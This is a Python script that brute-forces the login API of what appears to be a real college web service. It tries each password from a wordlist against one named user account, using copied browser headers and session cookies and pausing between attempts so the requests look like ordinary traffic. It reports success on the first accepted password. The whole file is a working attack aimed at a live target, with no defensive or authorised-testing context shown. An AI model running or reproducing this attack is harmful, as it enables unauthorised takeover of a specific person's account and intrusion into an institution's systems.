import requests
import time
url = "https://mess.mtc.edu.om/api/UserLogin"

headers = {
    "Accept": "application/json, text/plain, */*",
    "Accept-Language": "ar,en-US;q=0.9,en;q=0.8",
    "Connection": "keep-alive",
    "Content-Type": "application/json;charset=UTF-8",
    "Origin": "https://mess.mtc.edu.om",
    "Referer": "https://mess.mtc.edu.om/Login.html",
    "Sec-Fetch-Dest": "empty",
    "Sec-Fetch-Mode": "cors",
    "Sec-Fetch-Site": "same-origin",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36",
    "sec-ch-ua": '"Google Chrome";v="135", "Not-A.Brand";v="8", "Chromium";v="135"',
    "sec-ch-ua-mobile": "?0",
    "sec-ch-ua-platform": '"Windows"',
}

cookies = {
    "BIGipServermess_pool": "436734474.20992.0000",
    "TS01f8fc87": "013a7cca74d23cc416e8374bc5bac1152b79c2eb9381f4e64c8ab793a36f3899386ed8f009a157c54b6f19efb5bb0445b3c224a3ca82bc0a76124ba989c80a42b0b4a1a24c",
}

passwords = open("passwords.txt","r")
passwords = passwords.readlines()
for i in passwords:
    password = i.strip()
    time.sleep(0.3)
    payload = {
        "UserName": "dominic.hanratty",
        "Password": password
    }
    
    response = requests.post(url, headers=headers, cookies=cookies, json=payload)
    print(response.status_code)
    print(response.json())  # or response.text if the server doesn't return JSON
    
    if response.status_code == 200:
        print("SUCESS:  ",payload)
        break
